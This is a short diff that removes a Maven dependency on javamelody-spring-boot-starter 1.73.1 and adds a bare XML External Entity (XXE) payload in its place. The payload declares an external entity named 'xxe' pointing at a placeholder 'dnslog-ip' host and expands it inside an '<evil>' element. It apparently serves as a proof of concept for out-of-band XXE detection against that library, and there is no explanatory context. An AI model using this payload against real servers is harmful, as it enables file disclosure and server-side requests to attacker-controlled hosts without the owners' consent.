@@ -1,5 +1,5 @@
-<dependency>
-            <groupId>net.bull.javamelody</groupId>
-            <artifactId>javamelody-spring-boot-starter</artifactId>
-            <version>1.73.1</version>
-        </dependency
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+        <!ENTITY xxe SYSTEM "dnslog-ip">
+        ]>
+<evil>&xxe;</evil>
